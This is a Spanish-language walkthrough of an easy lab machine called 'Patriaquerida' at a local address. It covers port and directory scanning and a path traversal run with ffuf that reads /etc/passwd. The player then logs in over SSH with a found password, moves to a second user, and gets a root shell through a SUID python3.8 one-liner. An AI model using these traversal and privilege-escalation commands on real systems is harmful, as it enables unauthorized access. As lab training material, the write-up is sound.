---
description: '✍️ Autor: JuanR🔍 Dificultad: Fácil 📅 Fecha de creación: 12/01/2025'
---

# Patriaquerida

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) ( (7).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/imagen (6).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.&#x20;

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 172.17.0.2
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/imagen (1) (1).png" alt=""><figcaption></figcaption></figure>

En el puerto 80 corre la página por defecto de Apache por lo que realizamos un escaneo de directorios.

<figure><img src="../../.gitbook/assets/imagen (2) (1).png" alt=""><figcaption></figcaption></figure>

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,txt,php,xml
```

<figure><img src="../../.gitbook/assets/imagen (5) (1).png" alt=""><figcaption></figcaption></figure>

Observamos que se encuentra un archivo llamado **index.php**, así que procederemos a explorar el contenido de esa ruta.

<figure><img src="../../.gitbook/assets/imagen (3) (1).png" alt=""><figcaption></figcaption></figure>

Nos indican directamente dónde buscar, así que accedemos a la ruta: **172.17.0.2/.hidden\_pass**.

<figure><img src="../../.gitbook/assets/imagen (4) (1).png" alt=""><figcaption></figcaption></figure>

Encontramos lo que parece ser una contraseña: **balu**.

### 🚀 **EXPLOTACIÓN**

Dado que existen rutas visibles, utilizaremos **FFUZ** para explorar más a fondo. Tal como se muestra en la imagen, el servidor es vulnerable a **Path Traversal**, lo que nos permite acceder al archivo **/etc/passwd**.

```bash
ffuf -u "http://172.17.0.2/index.php?FUZZ=/etc/passwd" -w directory-list-2.3-medium.txt -fw 12
```

<figure><img src="../../.gitbook/assets/imagen (6) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/imagen (7).png" alt=""><figcaption></figcaption></figure>

Con la contraseña **balu** nos podemos loguear con el usuario **pinguino**.

```bash
ssh pinguino@172.17.0.2
```

<figure><img src="../../.gitbook/assets/imagen (8).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Indagando encontramos la contraseña del usuario **mario** por lo que pivotamos a él.

<figure><img src="../../.gitbook/assets/imagen (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/imagen (10).png" alt=""><figcaption></figcaption></figure>

Al buscar permisos **SUID** encontramos que tenemos con **python3.8**.

```
find / -perm -4000 2>/dev/null
```

<figure><img src="../../.gitbook/assets/imagen (12).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://gtfobins.github.io/gtfobins/python/#suid" %}

```bash
/usr/bin/python3.8 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

<figure><img src="../../.gitbook/assets/imagen (13).png" alt=""><figcaption></figcaption></figure>
